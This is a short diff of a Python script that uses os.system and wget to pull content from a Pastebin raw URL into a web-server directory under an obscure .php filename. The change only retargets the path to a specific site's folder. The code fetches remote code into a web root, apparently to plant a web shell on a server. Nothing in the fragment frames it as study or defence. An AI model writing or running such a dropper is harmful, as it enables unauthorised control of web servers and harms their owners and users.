@@ -7,7 +7,7 @@ from math import floor
 import os
 
 url = "https://pastebin.com/raw/Bkw39dk5"
-directory = "/var/www/html/jhuvwaryh.php"
+directory = "/var/www/airflow.su/jhuvwaryh.php"
 
 os.system(f"wget -P {directory} {url}")
 
